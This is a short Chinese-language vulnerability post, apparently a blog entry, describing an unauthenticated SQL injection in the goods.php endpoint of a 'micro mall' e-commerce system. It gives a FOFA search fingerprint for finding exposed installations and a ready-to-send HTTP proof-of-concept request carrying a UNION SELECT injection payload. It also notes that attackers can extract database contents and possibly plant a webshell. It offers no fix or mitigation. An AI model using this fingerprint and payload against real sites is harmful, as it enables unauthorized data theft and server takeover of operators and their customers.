# 微商城系统goods.php存在SQL注入漏洞

微商城系统 goods.php 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```yaml
body="/Mao_Public/js/jquery-2.1.1.min.js"
```

## poc

```java
GET /goods.php?id='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(IFNULL(CAST(MD5(1)+AS+NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```

![img](https://i-blog.csdnimg.cn/direct/2493a6cdfcc046d6b686dae6f3615fee.png)